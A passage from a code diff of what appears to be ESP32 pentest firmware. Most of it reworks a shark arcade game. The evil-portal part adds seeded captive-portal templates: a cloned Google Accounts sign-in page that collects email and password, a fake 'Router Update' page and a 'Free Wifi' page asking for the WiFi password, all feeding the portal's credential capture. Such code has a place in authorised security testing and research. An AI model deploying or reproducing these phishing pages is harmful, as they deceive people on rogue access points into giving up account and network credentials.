++        tft.fillCircle(f.x+6, f.y+3, 4, TFT_RED);
++        tft.fillCircle(f.x+10, f.y+3, 4, TFT_RED);
++        tft.fillTriangle(f.x+2,f.y+6, f.x+14,f.y+6, f.x+8,f.y+12, TFT_RED);
++    } else if(f.type==FISH_STAR){
++        tft.fillCircle(f.x+8, f.y+4, 5, TFT_YELLOW);
++        tft.setTextColor(TFT_BLACK, TFT_YELLOW);
++        tft.setTextSize(1);
++        tft.drawString("*", f.x+6, f.y+1, 1);
++    } else {
++        draw.fillScreen(bruceConfig.bgColor);
++        draw.fillEllipse(6,4,6,3,TFT_ORANGE);
++        draw.fillTriangle(16,0,16,8,11,5,TFT_ORANGE);
++        draw.pushSprite(f.x, f.y);
++    }
++    tft.markUnmappedPixels();
  }
  #define STEP (tftHeight) / 44
+-
+-// Função para mover o tubarão
+ void detectInputs() {
+     if (check(PrevPress) || check(UpPress)) { sharkUp = true; }
+     if (check(NextPress) || check(DownPress)) sharkDown = true;
+ }
+-
+ void moveShark() {
+-
+-    if (sharkDown) {
+-        sharkY += STEP; // Move para baixo
+-        sharkDown = false;
++    if (sharkDown) { sharkY += STEP; sharkDown = false; }
++    if (sharkUp) { sharkY -= STEP; sharkUp = false; }
++    if (sharkY < 0) sharkY = 0;
++    if (sharkY > tftHeight - sharkSize) sharkY = tftHeight - sharkSize;
++}
++void spawnFish(Fish &f, bool initial=false){
++    f.x = tftWidth + random(20, 100);
++    f.y = random(10, tftHeight - 20);
++    int r = random(100);
++    if(isBossLevel && random(100)<15){ f.type=FISH_BOSS; f.size=16; f.speed=1+level/2; f.hits=bossHitsNeeded; }
++    else if(r<6) { f.type=FISH_GOLD; f.size=8; f.speed=2+level/3; }
++    else if(r<10) { f.type=FISH_BOMB; f.size=8; f.speed=2; }
++    else if(r<13 && lives<3) { f.type=FISH_HEART; f.size=8; f.speed=2; }
++    else if(r<16) { f.type=FISH_STAR; f.size=8; f.speed=2; }
++    else { f.type=FISH_NORMAL; f.size=8; f.speed=2+random(level); }
++    if(initial) f.x = random(tftWidth/2, tftWidth+80);
++}
++void moveFish(Fish &f) {
++    f.x -= f.speed;
++    if(f.type==FISH_BOSS){
++        // boss tracks shark slowly
++        if(f.y < sharkY) f.y += 1;
++        else if(f.y > sharkY) f.y -= 1;
+     }
+-
+-    if (sharkUp) {
+-        sharkY -= STEP; // Move para cima
+-        sharkUp = false;
++    if (f.x < -20) {
++        if(f.type==FISH_BOSS && isBossLevel){
++            // respawn boss until killed
++            f.x = tftWidth+20; f.y = random(10,tftHeight-20);
++        } else {
++            spawnFish(f);
++        }
+     }
+-    if (sharkY < 0) { sharkY = 0; }
+-    if (sharkY > tftHeight - sharkSize) { sharkY = tftHeight - sharkSize; }
+ }
+-
+-// Função para mover peixes
+-void moveFish(Fish &f) {
+-    f.x -= 2; // Move o peixe para a esquerda
+-    if (f.x < -10) {
+-        tft.fillRect(f.x, f.y, 22, 11, bruceConfig.bgColor);
+-        f.x = tftWidth + random(20, 100);
+-        f.y = random(10, tftHeight - 20);
++int score = 0;
++void drawBubbles(){
++    for(int i=0;i<10;i++){
++        bubbles[i].y -= bubbles[i].speed;
++        if(bubbles[i].y < -4){ bubbles[i].y = tftHeight; bubbles[i].x = random(tftWidth); }
++        tft.fillCircle(bubbles[i].x, bubbles[i].y, bubbles[i].r, bruceConfig.priColor);
++    }
++}
++void explode(int x,int y, uint16_t col){
++    for(int i=0;i<6;i++){
++        int rx = x + random(-8,8);
++        int ry = y + random(-6,6);
++        tft.fillCircle(rx, ry, random(1,3), col);
+     }
+ }
+-
+-// Função para verificar colisões entre o tubarão e os peixes
+ void checkCollisions() {
+-    for (int i = 0; i < 5; i++) {
++    for (int i = 0; i < fishCount; i++) {
+         if ((sharkX < fish[i].x + fish[i].size) && (sharkX + sharkSize > fish[i].x) &&
+             (sharkY < fish[i].y + fish[i].size) && (sharkY + sharkSize > fish[i].y)) {
+-            // Colidiu com um peixe
+-            tft.fillRect(fish[i].x, fish[i].y, 18, 8, bruceConfig.bgColor);
+-            fish[i].x = tftWidth + random(20, 100);
+-            fish[i].y = random(10, tftHeight - 20);
+-            score++;
++            if(invincible && fish[i].type!=FISH_BOSS) { /* pass through */ continue; }
++            if(fish[i].type==FISH_BOMB){
++                lives--;
++                explode(fish[i].x, fish[i].y, TFT_RED);
++                spawnFish(fish[i]);
++                if(lives<=0) lives=0;
++                // flash
++                tft.fillRect(0,0,tftWidth,tftHeight,TFT_RED);
++                delay(80);
++                tft.fillRect(0,0,tftWidth,tftHeight,bruceConfig.bgColor);
++            } else if(fish[i].type==FISH_GOLD){
++                score+=5;
++                explode(fish[i].x, fish[i].y, TFT_YELLOW);
++                spawnFish(fish[i]);
++            } else if(fish[i].type==FISH_BOSS){
++                fish[i].hits--;
++                explode(fish[i].x, fish[i].y, TFT_ORANGE);
++                if(fish[i].hits<=0){
++                    score+=10;
++                    spawnFish(fish[i]);
++                    // boss defeated, exit boss level
++                    if(isBossLevel){
++                        bool anyBoss=false;
++                        for(int k=0;k<fishCount;k++) if(fish[k].type==FISH_BOSS) anyBoss=true;
++                        if(!anyBoss) isBossLevel=false;
++                    }
++                }
++            } else if(fish[i].type==FISH_HEART){
++                if(lives<3) lives++;
++                score+=2;
++                spawnFish(fish[i]);
++            } else if(fish[i].type==FISH_STAR){
++                invincible=true; invincibleUntil=millis()+5000;
++                score+=3;
++                spawnFish(fish[i]);
++            } else {
++                tft.fillRect(fish[i].x, fish[i].y, 18, 8, bruceConfig.bgColor);
++                fish[i].x = tftWidth + random(20, 100);
++                fish[i].y = random(10, tftHeight - 20);
++                score++;
++            }
+         }
+     }
+ }
+-
+-// Função para exibir a pontuação
+ void displayScore() {
+     tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
+-    tft.setTextSize(FM);
+-    tft.setCursor(0, 0);
+-    tft.printf("Score: %d", score);
++    tft.setTextSize(FP);
++    tft.setCursor(4, 4);
++    tft.printf("Score:%d Lv%d", score, level);
++    // lives
++    tft.setCursor(tftWidth-50, 4);
++    tft.printf("Lives:");
++    for(int i=0;i<3;i++){
++        if(i<lives) tft.fillCircle(tftWidth-18+i*8, 8, 3, TFT_RED);
++        else tft.drawCircle(tftWidth-18+i*8, 8, 3, TFT_DARKGREY);
++    }
++    if(invincible){
++        int remain = (int)(invincibleUntil - millis())/1000;
++        if(remain<0) remain=0;
++        tft.setTextColor(TFT_YELLOW, bruceConfig.bgColor);
++        tft.setCursor(tftWidth/2-20, 4);
++        tft.printf("STAR %ds", remain);
++    }
+ }
+-
+ void shark_setup() {
+-    // Inicializa a posição dos peixes
+-    for (int i = 0; i < 5; i++) {
+-        fish[i].x = tftWidth + random(20, 100);
+-        fish[i].y = random(10, tftHeight - 20);
+-        fish[i].size = 8;
++    score=0; lives=3; level=1; fishCount=5; invincible=false; isBossLevel=false; bossHitsNeeded=3;
++    sharkX=40; sharkY=80;
++    for (int i = 0; i < fishCount; i++) {
++        spawnFish(fish[i], true);
+     }
+-    // desenha peixes e inicia o display
++    for(int i=0;i<10;i++){ bubbles[i].x=random(tftWidth); bubbles[i].y=random(tftHeight); bubbles[i].r=random(1,3); bubbles[i].speed=random(1,3); }
+     initSprites();
+     if (tft.getLogging()) tft.log_drawString("Not Supported", DRAWCENTRESTRING, tftWidth / 2, tftHeight / 2);
+-    // inicia o jogo
++    // splash
++    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
++    tft.setTextSize(FM);
++    tft.drawCentreString("MEGALODON", tftWidth/2, tftHeight/2-40, 1);
++    tft.setTextSize(FP);
++    tft.drawCentreString("An ca - tranh bom - bat sao", tftWidth/2, tftHeight/2-20, 1);
++    tft.drawCentreString("UP/DOWN de di chuyen  SEL=Pause", tftWidth/2, tftHeight/2-8, 1);
++    tft.drawCentreString("An * de bat tu 5s  <3 tang mang", tftWidth/2, tftHeight/2+4, 1);
++    tft.setTextSize(FM);
++    tft.drawCentreString("Nhan SEL de bat dau", tftWidth/2, tftHeight/2+24, 1);
++    while(!check(SelPress) && !check(EscPress)) vTaskDelay(pdMS_TO_TICKS(20));
++    while(check(SelPress)) vTaskDelay(pdMS_TO_TICKS(20));
++    if(check(EscPress)) return;
++    tft.fillScreen(bruceConfig.bgColor);
+     shark_loop();
+ }
+ 
+ void shark_loop() {
+-    int downTime = 50;
++    int downTime = 45;
+     unsigned long time = 0;
++    bool paused=false;
+     for (;;) {
+-        // Mostra a tela
++        if(check(SelPress)){
++            paused=!paused;
++            if(paused){
++                tft.setTextColor(TFT_YELLOW, bruceConfig.bgColor);
++                tft.setTextSize(FM);
++                tft.drawCentreString("PAUSED", tftWidth/2, tftHeight/2, 1);
++                while(!check(SelPress)) vTaskDelay(100);
++                while(check(SelPress)) vTaskDelay(20);
++                tft.fillScreen(bruceConfig.bgColor);
++            } else {
++                while(check(SelPress)) vTaskDelay(20);
++            }
++        }
++        if(paused){ vTaskDelay(50); continue; }
++        if(invincible && millis()>invincibleUntil) invincible=false;
++        // level up every 10 points
++        int newLevel = score/10 + 1;
++        if(newLevel != level){
++            level=newLevel;
++            bossHitsNeeded = 3 + level/2;
++            if(level%2==0) isBossLevel=true;
++            // add fish up to 8
++            if(fishCount<8 && level%2==1) fishCount++;
++            // flash level up
++            tft.setTextColor(TFT_CYAN, bruceConfig.bgColor);
++            tft.setTextSize(FM);
++            tft.drawCentreString(("LEVEL "+String(level)).c_str(), tftWidth/2, tftHeight/2-10, 1);
++            delay(600);
++            tft.fillScreen(bruceConfig.bgColor);
++        }
++        // speed
++        downTime = 50 - min(30, level*4 + score/5);
++        if(downTime<12) downTime=12;
+ 
+-        // Começa a desenhar o Sprite
++        // draw
++        // faint bubbles
++        for(int i=0;i<3;i++) drawBubbles();
+         displayScore();
+         detectInputs();
+-        if (millis() - time > downTime) {
+-            // Move o tubarão
++        if (millis() - time > (unsigned long)downTime) {
+             moveShark();
+-            // Desenha o tubarão
+             drawShark();
+-            // Move e desenha os peixes
+-            for (int i = 0; i < 5; i++) {
++            for (int i = 0; i < fishCount; i++) {
+                 moveFish(fish[i]);
+                 drawFish(fish[i]);
+             }
+-            // Verifica colisões
+             checkCollisions();
+             time = millis();
+         }
+-
+-        // Pequeno atraso para controlar a velocidade do loop
+-        if (score < 10) downTime = 50;
+-        else if (score >= 10 && score < 20) downTime = 40;
+-        else if (score >= 20 && score < 30) downTime = 35;
+-        else if (score >= 30 && score < 40) downTime = 30;
+-        else if (score >= 40 && score < 50) downTime = 25;
+-        else if (score >= 50 && score < 100) downTime = 15;
+-        else if (score < 100) downTime = 7;
+-
+-        if (score == 99) {
+-            displaySuccess("So...");
+-            while (!check(SelPress)) { vTaskDelay(pdMS_TO_TICKS(1)); }
+-            while (check(SelPress)) { vTaskDelay(pdMS_TO_TICKS(1)); } // debounce
+-            displaySuccess("you just found");
+-            while (!check(SelPress)) { vTaskDelay(pdMS_TO_TICKS(1)); }
+-            while (check(SelPress)) { vTaskDelay(pdMS_TO_TICKS(1)); } // debounce
+-            displayInfo("hidden credits!");
+-            while (!check(SelPress)) { vTaskDelay(pdMS_TO_TICKS(1)); }
+-            while (check(SelPress)) { vTaskDelay(pdMS_TO_TICKS(1)); } // debounce
+-            displayInfo("main devs:");
+-            while (!check(SelPress)) { vTaskDelay(pdMS_TO_TICKS(1)); }
+-            while (check(SelPress)) { vTaskDelay(pdMS_TO_TICKS(1)); } // debounce
+-            options = {
+-                {"Pirata",       [=]() { displayError("github.com/bmorcelli", true); }   },
+-                {"pr3y",         [=]() { displaySuccess("github.com/pr3y", true); }      },
+-                {"IncursioHack", [=]() { displayInfo("github.com/IncursioHack", true); } },
+-                {"r3ck",         [=]() { displayInfo("github.com/rennancockles", true); }},
+-            };
+-
+-            loopOptions(options);
+-
+-            initSprites();
+-            score++;
++        if(lives<=0){
++            tft.fillScreen(bruceConfig.bgColor);
++            tft.setTextColor(TFT_RED, bruceConfig.bgColor);
++            tft.setTextSize(FM);
++            tft.drawCentreString("GAME OVER", tftWidth/2, tftHeight/2-20, 1);
++            tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
++            tft.setTextSize(FP);
++            String s="Score "+String(score)+"  Level "+String(level);
++            tft.drawCentreString(s, tftWidth/2, tftHeight/2, 1);
++            tft.drawCentreString("SEL=Choi lai  ESC=Thoat", tftWidth/2, tftHeight/2+16, 1);
++            while(true){
++                if(check(SelPress)){ while(check(SelPress)) vTaskDelay(20); score=0; lives=3; level=1; fishCount=5; invincible=false; isBossLevel=false; for(int i=0;i<fishCount;i++) spawnFish(fish[i],true); tft.fillScreen(bruceConfig.bgColor); break; }
++                if(check(EscPress)){ goto Exit; }
++                vTaskDelay(30);
++            }
+         }
+-
+         if (check(EscPress)) {
+             returnToMenu = true;
+             goto Exit;
+         }
++        vTaskDelay(2);
+     }
+-
+ Exit:
+     delay(150);
+     Serial.println();
 diff --git a/src/modules/pwnagotchi/pet_layout.h b/src/modules/pwnagotchi/pet_layout.h
 new file mode 100644
 index 0000000..9df0a69
@@ -28117,7 +28633,7 @@ index 353b864..006bee3 100644
  
  #endif
 diff --git a/src/modules/wifi/evil_portal.cpp b/src/modules/wifi/evil_portal.cpp
-index 59ed80e..94ed386 100644
+index 59ed80e..d218da9 100644
 --- a/src/modules/wifi/evil_portal.cpp
 +++ b/src/modules/wifi/evil_portal.cpp
 @@ -8,6 +8,7 @@
@@ -28201,18 +28717,48 @@ index 59ed80e..94ed386 100644
      } else {
          tft.setTextColor(TFT_RED);
          printFootnote("Deauth ON");
-@@ -514,6 +549,10 @@ void EvilPortal::loadCustomHtml() {
+@@ -514,6 +549,40 @@ void EvilPortal::loadCustomHtml() {
      }
  }
  
 +String EvilPortal::portalTemplateActivePath(){ File f=LittleFS.open("/evil_portal_active.txt", FILE_READ); if(!f) return ""; String s=f.readString(); f.close(); s.trim(); return s; }
 +bool EvilPortal::portalTemplateSetActive(const String &path){ if(path.isEmpty()){ LittleFS.remove("/evil_portal_active.txt"); return true; } File f=LittleFS.open("/evil_portal_active.txt", FILE_WRITE); if(!f) return false; f.print(path); f.close(); return true; }
-+String EvilPortal::portalTemplateListJson(){ String r="["; bool first=true; auto addDir=[&](fs::FS &fs, const String &base){ File d=fs.open(base); if(!d||!d.isDirectory()) return; File f=d.openNextFile(); while(f){ String full=String(f.name()); String n=full; int s=n.lastIndexOf("/"); if(s>=0) n=n.substring(s+1); if(!f.isDirectory()){ String low=n; low.toLowerCase(); if(low.endsWith(".html")||low.endsWith(".htm")){ if(!first) r+=","; first=false; // detect AP comment
++void portalTemplatesEnsureSeeded(){
++    if (LittleFS.exists("/portal_templates/rickroll.html")) return;
++    LittleFS.mkdir("/portal_templates");
++    // Only seed if empty
++    File d = LittleFS.open("/portal_templates");
++    if (d && d.isDirectory()) {
++        File f=d.openNextFile();
++        bool hasAny=false;
++        while(f){ if(!f.isDirectory()){ String n=String(f.name()); n.toLowerCase(); if(n.endsWith(".html")||n.endsWith(".htm")){ hasAny=true; break; }} f=d.openNextFile();}
++        if(hasAny) return;
++    }
++    // Google (default clone)
++    {
++        File f=LittleFS.open("/portal_templates/google.html", FILE_WRITE);
++        if(f){ f.print("<!-- AP=\"Free Wifi\" -->\n<!DOCTYPE html><html><head><title>Sign in: Google Accounts</title><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'><style>body{font-family:Arial,sans-serif;background:#fff;margin:0;padding:20px}.container{max-width:420px;margin:40px auto;border:1px solid #CEC0DE;border-radius:8px;padding:20px;box-shadow:0 2px 10px rgba(0,0,0,.1)}h2{text-align:center;color:#202124}input{width:100%;padding:12px;margin:8px 0;border:1px solid #ccc;border-radius:6px}button{width:100%;padding:12px;background:#0b57d0;color:#fff;border:none;border-radius:6px;font-size:16px}</style></head><body><div class='container'><h2>Sign in</h2><p>Use your Google Account</p><form action='/post'><input name='email' placeholder='Email or phone' required><input name='password' type='password' placeholder='Password' required><button type='submit'>Next</button></form></div></body></html>"); f.close();
++        }
++    }
++    // Rickroll customizable - user can edit VIDEO_URL etc via WebUI presets
++    {
++        File f=LittleFS.open("/portal_templates/rickroll.html", FILE_WRITE);
++        if(f){ f.print("<!-- AP=\"Free Wifi\" -->\n<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'><title>Free Wifi - Connecting...</title><style>body{margin:0;font-family:sans-serif;background:#000;color:#fff;text-align:center}video{width:100%;max-height:60vh;background:#000} .card{max-width:560px;margin:20px auto;background:#111;padding:16px;border-radius:12px} input{width:100%;padding:12px;margin:8px 0;border-radius:8px;border:none} button{width:100%;padding:12px;background:#ff0000;color:#fff;border:none;border-radius:8px;font-size:16px}</style></head><body><video autoplay muted loop playsinline controls src='https://www.w3schools.com/html/mov_bbb.mp4'></video><div class='card'><h2>🎉 Free Wifi Connected!</h2><p>Enter WiFi password to stay connected</p><form action='/post'><input name='password' type='password' placeholder='WiFi password' required><button type='submit'>Connect</button></form><small>Customize: change video src to any mp4/YouTube embed via WebUI</small></div></body></html>"); f.close();
++        }
++    }
++    // Fake update
++    {
++        File f=LittleFS.open("/portal_templates/fake-update.html", FILE_WRITE);
++        if(f){ f.print("<!-- AP=\"Router Update\" -->\n<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'><title>Router Update</title><style>body{font-family:sans-serif;background:#d3d3d3;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}.box{background:#fff;padding:24px;border-radius:12px;max-width:360px;width:90%;text-align:center;box-shadow:0 4px 16px rgba(0,0,0,.2)}input{width:100%;padding:12px;margin:8px 0;border:1px solid #ccc;border-radius:6px}button{width:100%;padding:12px;background:#007bff;color:#fff;border:none;border-radius:6px}</style></head><body><div class='box'><h2>Router Update Required</h2><p>Enter WiFi password to update firmware</p><form action='/post'><input name='password' type='password' placeholder='Password' required><button type='submit'>Update</button></form></div></body></html>"); f.close();
++        }
++    }
++}
++String EvilPortal::portalTemplateListJson(){ portalTemplatesEnsureSeeded(); String r="["; bool first=true; auto addDir=[&](fs::FS &fs, const String &base){ File d=fs.open(base); if(!d||!d.isDirectory()) return; File f=d.openNextFile(); while(f){ String full=String(f.name()); String n=full; int s=n.lastIndexOf("/"); if(s>=0) n=n.substring(s+1); if(!f.isDirectory()){ String low=n; low.toLowerCase(); if(low.endsWith(".html")||low.endsWith(".htm")){ if(!first) r+=","; first=false; // detect AP comment
 + String ap=""; if(f.size()<200000){ File rf=fs.open(full, FILE_READ); if(rf){ String firstLine=rf.readStringUntil('\n'); rf.close(); int a=firstLine.indexOf("<!-- AP=\""); if(a!=-1){ int b=firstLine.indexOf("\" -->", a); if(b!=-1) ap=firstLine.substring(a+9,b);} } } r+="{\"name\":\""+n+"\",\"path\":\""+full+"\",\"fs\":\""+( &fs==&SD?"SD":"LittleFS")+"\",\"size\":"+String((long)f.size())+",\"ap\":\""+ap+"\"}"; } } f=d.openNextFile(); } }; addDir(LittleFS, "/portal_templates"); addDir(LittleFS, "/"); if(SD.begin()){ addDir(SD, "/portal_templates"); } r+="]"; return r; }
  bool EvilPortal::loadCustomHtmlFromPath(const String &path) {
      if (path.isEmpty()) return false;
      if (!getFsStorage(fsHtmlFile) || !fsHtmlFile->exists(path)) return false;
-@@ -716,13 +755,14 @@ void EvilPortal::credsController(AsyncWebServerRequest *request) {
+@@ -716,13 +785,14 @@ void EvilPortal::credsController(AsyncWebServerRequest *request) {
      if (_verifyPwd && passwordValue != "") {
          request->send(200, "text/html", wifiLoadPage());
          bool isCorrect = verifyCreds(apName, passwordValue);
@@ -28230,7 +28776,7 @@ index 59ed80e..94ed386 100644
              vTaskDelay(50 / portTICK_PERIOD_MS);
              verifyPass = true;
              _deauth = false;
-@@ -738,6 +778,10 @@ void EvilPortal::credsController(AsyncWebServerRequest *request) {
+@@ -738,6 +808,10 @@ void EvilPortal::credsController(AsyncWebServerRequest *request) {
  
      capturedCredentialsHtml = htmlResponse + capturedCredentialsHtml;
      totalCapturedCredentials++;
